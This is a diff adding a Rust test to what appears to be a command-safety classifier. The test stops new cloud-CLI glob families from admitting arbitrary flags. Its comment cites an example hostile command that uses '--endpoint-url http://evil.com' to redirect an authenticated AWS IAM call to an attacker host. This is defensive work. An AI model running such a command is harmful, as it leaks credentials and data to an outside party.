@@ -5460,3 +5460,72 @@ valued = ["--type"]
             failures.join("\n")
         );
     }
+
+/// A `first_arg` GLOB admits an invocation on its first positional and — before
+/// `glob_presents_unlisted_flag` — never looked at the rest of the line, so any flag rode along:
+/// `aws iam list-users --endpoint-url http://evil.com` classified as an ordinary read while
+/// redirecting an authenticated IAM call to an attacker host.
+///
+/// The fix is a per-family researched flag list, but ~240 AWS/Azure/GCP service groups cannot be
+/// researched at once and denying them wholesale would break every cloud read. So an undeclared
+/// family stays permissive, and this guard RATCHETS the un-migrated set: the command list and the
+/// count both only shrink. A new glob family cannot join without either declaring its flags or
+/// forcing an author to edit these numbers in review.
+#[test]
+fn no_new_unresearched_first_arg_family() {
+    use super::types::DispatchKind;
+
+    fn walk(prefix: &str, kind: &DispatchKind, out: &mut Vec<String>) {
+        let unresearched = |pfx: &str, patterns: &[String], sa: &[String], v: &[String], out: &mut Vec<String>| {
+            if patterns.iter().any(|p| p.ends_with('*')) && sa.is_empty() && v.is_empty() {
+                out.push(pfx.to_string());
+            }
+        };
+        match kind {
+            DispatchKind::FirstArg { patterns, standalone, valued, .. } => {
+                unresearched(prefix, patterns, standalone, valued, out);
+            }
+            DispatchKind::Branching { subs, first_arg, first_arg_standalone, first_arg_valued, .. } => {
+                unresearched(prefix, first_arg, first_arg_standalone, first_arg_valued, out);
+                for s in subs {
+                    walk(&format!("{prefix} {}", s.name), &s.kind, out);
+                }
+            }
+            _ => {}
+        }
+    }
+
+    let mut found = Vec::new();
+    for (name, spec) in TOML_REGISTRY.iter() {
+        walk(name, &spec.kind, &mut found);
+    }
+    found.sort();
+
+    // Commands that still own at least one unresearched glob family. Shrinks as the campaign
+    // migrates them; a command NOT on this list may not introduce one.
+    const GRANDFATHERED: &[&str] = &[
+        "aws", "az", "gcloud", "kubectl", "networksetup", "npm", "oci", "yarn",
+    ];
+    let stray: Vec<&String> = found
+        .iter()
+        .filter(|f| {
+            let cmd = f.split_whitespace().next().unwrap_or("");
+            !GRANDFATHERED.contains(&cmd)
+        })
+        .collect();
+    assert!(
+        stray.is_empty(),
+        "new unresearched `first_arg` glob family — declare `first_arg_standalone`/`first_arg_valued` \
+         for it (a glob without a flag list admits ANY flag, including --endpoint-url): {stray:#?}",
+    );
+
+    // Exact count, so migrating one family and adding another nets out visibly instead of silently.
+    const REMAINING: usize = 249;
+    assert_eq!(
+        found.len(),
+        REMAINING,
+        "unresearched glob-family count changed ({} now, {REMAINING} pinned). Migrating families? \
+         lower the number. Adding one? justify it in review.",
+        found.len(),
+    );
+}
